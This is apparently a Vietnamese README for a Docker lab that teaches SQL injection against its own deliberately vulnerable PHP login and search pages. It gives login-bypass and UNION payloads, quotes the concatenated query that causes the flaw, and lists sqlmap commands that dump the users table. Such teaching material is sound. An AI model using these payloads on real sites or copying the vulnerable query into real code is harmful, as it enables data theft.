# SQL Injection Demo - Docker Setup

Đây là một môi trường demo đơn giản để học và trình diễn SQL Injection bằng Docker.

## Yêu cầu

- Docker và Docker Compose đã được cài đặt
- Trình duyệt web

## Cách chạy

### Trên Windows (Đơn giản nhất):

1. **Khởi động demo:**
   - Chạy file `start.bat` (sẽ tự động khởi động containers và mở trình duyệt)

2. **Dừng demo:**
   - Chạy file `end.bat`

3. **Reset hoàn toàn:**
   - Chạy file `reset.bat` (xóa dữ liệu và khởi động lại)

### Trên Linux/Mac hoặc Windows (Command Line):

1. **Khởi động các container:**
```bash
docker-compose up -d
```

2. **Kiểm tra các container đang chạy:**
```bash
docker-compose ps
```

3. **Mở trình duyệt và truy cập:**
```
http://localhost:8080
```

4. **Dừng các container:**
```bash
docker-compose down
```

## Cấu trúc

- `docker-compose.yml`: Cấu hình Docker Compose cho web server và database
- `Dockerfile`: Build image PHP với extension mysqli
- `init.sql`: Script khởi tạo database và dữ liệu mẫu
- `app/index.php`: Trang login dễ bị SQL Injection
- `app/search.php`: Trang tìm kiếm sản phẩm dễ bị SQL Injection
- `start.bat` / `end.bat` / `reset.bat`: Script tự động cho Windows
- `HUONG_DAN_SQLMAP.md`: Hướng dẫn sử dụng sqlmap
- `SCRIPT_THUYET_TRINH.md`: Script thuyết trình chi tiết
- `NGUYEN_LY_KY_THUAT.md`: Giải thích nguyên lý và kiến thức kỹ thuật
- `SLIDE_DEMO_OUTLINE.md`: Outline cho slide demo

## Demo SQL Injection

### 1. Demo Login Bypass

**Trang:** http://localhost:8080/index.php

**Đăng nhập bình thường:**
- Username: `admin`
- Password: `admin123`

**Tấn công SQL Injection:**

**Cách 1 (Đơn giản nhất - Dùng comment với #):**
- Username: `admin' #`
- Password: (để trống hoặc nhập bất kỳ)
- Giải thích: Dấu `#` sẽ comment phần password check, chỉ cần username đúng là đăng nhập được

**Cách 1b (Dùng comment với --):**
- Username: `admin' -- ` (lưu ý: có khoảng trắng sau --)
- Password: (để trống hoặc nhập bất kỳ)
- Giải thích: MySQL yêu cầu khoảng trắng sau `--` để nhận diện comment

**Cách 2 (Dùng OR condition):**
- Username: `' OR '1'='1`
- Password: `' OR '1'='1`
- Giải thích: Cả 2 điều kiện username và password đều trở thành `'1'='1'` (luôn đúng)

### 2. Demo Search Injection

**Trang:** http://localhost:8080/search.php

**Tìm kiếm bình thường:**
- Keyword: `Laptop`

**Tấn công SQL Injection:**
- Keyword: `' OR '1'='1` (hiển thị tất cả sản phẩm)
- Keyword: `' UNION SELECT 1, database(), 3, 4 --` (lấy tên database)

## Giải thích

Ứng dụng này được thiết kế có lỗ hổng SQL Injection để demo. Code sử dụng string concatenation trực tiếp:

```php
$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

Điều này cho phép kẻ tấn công chèn mã SQL độc hại vào input.

## Lưu ý

⚠️ **CẢNH BÁO:** Đây chỉ là môi trường demo cho mục đích giáo dục. Không sử dụng code này trong môi trường production!

## Dữ liệu mẫu

### Users:
- admin / admin123 (role: admin)
- user1 / password1 (role: user)
- user2 / password2 (role: user)
- john / secret123 (role: user)

### Products:
- Laptop ($1500.00)
- Mouse ($25.00)
- Keyboard ($75.00)
- Monitor ($300.00)

## Sử dụng sqlmap (Tùy chọn)

Để demo với công cụ tự động sqlmap, xem file `HUONG_DAN_SQLMAP.md` để biết chi tiết.

Script demo nhanh:
```bash
# Phát hiện lỗ hổng
sqlmap -u "http://localhost:8080/search.php?keyword=test" --batch

# Liệt kê databases
sqlmap -u "http://localhost:8080/search.php?keyword=test" --dbs --batch

# Dump bảng users
sqlmap -u "http://localhost:8080/search.php?keyword=test" -D sqli_demo -T users --dump --batch
```

## Troubleshooting

Nếu gặp lỗi kết nối database:
1. Kiểm tra container database đã khởi động: `docker-compose ps`
2. Xem logs: `docker-compose logs db`
3. Đợi vài giây để database khởi tạo xong

Nếu muốn reset database:
```bash
docker-compose down -v
docker-compose up -d
```

Hoặc trên Windows: chạy `reset.bat`

## Tài liệu tham khảo

- `SCRIPT_THUYET_TRINH.md`: Script chi tiết để thuyết trình
- `NGUYEN_LY_KY_THUAT.md`: Giải thích nguyên lý và kiến thức kỹ thuật
- `SLIDE_DEMO_OUTLINE.md`: Outline cho slide demo
- `HUONG_DAN_SQLMAP.md`: Hướng dẫn sử dụng sqlmap

## License

Dự án này được tạo cho mục đích giáo dục. Sử dụng tự do cho việc học tập và nghiên cứu.

